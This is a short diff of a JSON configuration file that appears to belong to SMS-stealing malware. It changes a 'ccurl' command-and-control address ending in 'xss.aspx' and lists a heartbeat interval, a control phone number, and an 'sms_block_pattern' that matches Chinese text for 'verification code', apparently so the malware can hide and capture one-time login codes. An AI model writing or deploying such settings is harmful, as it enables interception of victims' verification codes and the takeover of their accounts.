@@ -1,4 +1,4 @@
-{"ccurl":"http://localhost:32915/xss.aspx",
+{"ccurl":"http://192.168.1.3:8077/xss.aspx",
 "heartbeat_time":"2",
 "cctel":"18026381861",
 "sms_block_pattern":"验证码",
